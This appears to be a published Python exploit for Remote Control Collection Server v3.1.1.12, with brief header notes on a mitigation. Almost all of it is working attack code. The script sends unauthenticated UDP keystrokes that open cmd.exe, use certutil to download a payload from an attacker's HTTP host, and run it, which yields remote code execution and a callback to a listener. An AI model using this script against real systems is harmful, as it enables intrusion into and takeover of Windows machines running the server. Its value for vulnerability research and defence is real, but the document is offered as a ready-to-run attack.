# Exploit: Remote Control Collection Server v3.1.1.12 - Remote Code Execution
# Exploit Author: H4rk3nz0
# Vendor Homepage: http://steppschuh.net/
# Software Link: http://remote-control-collection.com/download/server/windows/
# 'Remote Control Server' used by 'Remote Control Collection' app for mobile does not need to establish connection when sending commands over UDP
# This can be mitigated by enabling PIN and Whitelisting in Server settings which are disabled by default. PIN is sent in Plain Text however.

import socket
from time import sleep
import sys


port = 1926
target = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

characters={
	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
	" ":"20","+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
	">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}

# User Specified arguments
try:
	rhost = sys.argv[1]
	lhost = sys.argv[2]
	payload = sys.argv[3]
except:
	print("Usage: python " + sys.argv[0] + " <target-ip> <local-http-ip> <payload-name>")
	exit()

# Send Windows Key Down and Up Input
def SendWin():
	target.sendto("7f150201000000ab".decode("hex"),(rhost,port)) # Win Key Down
	target.sendto("7f150200000000ab".decode("hex"),(rhost,port)) # Win Key Up
	sleep(0.2)

# Send Enter/Return Key Input
def SendReturn():
	target.sendto("7f15020100000042".decode("hex"),(rhost,port)) # Enter/Return Key

# Send String Characters
def SendString(string,rhost):
	for char in string:
		convert = characters[char]
		target.sendto(("7f1501" + convert).decode("hex"),(rhost,port))
		sleep(0.05)

# Main Execution
def main():
	print("[+] Popping Start Menu")
	SendWin()
	sleep(0.5)
	print("[+] Opening CMD")
	SendString("cmd.exe",rhost)
	SendReturn()
	sleep(0.5)
	print("[+] Retrieving Payload")
	SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\Temp\\" + payload,rhost)
	SendReturn()
	sleep(3)
	print("[+] Executing")
	SendString("C:\\Windows\\Temp\\" + payload,rhost)
	SendReturn()
	print("[+] Done! Check your listener?")

if __name__=="__main__":
	main()
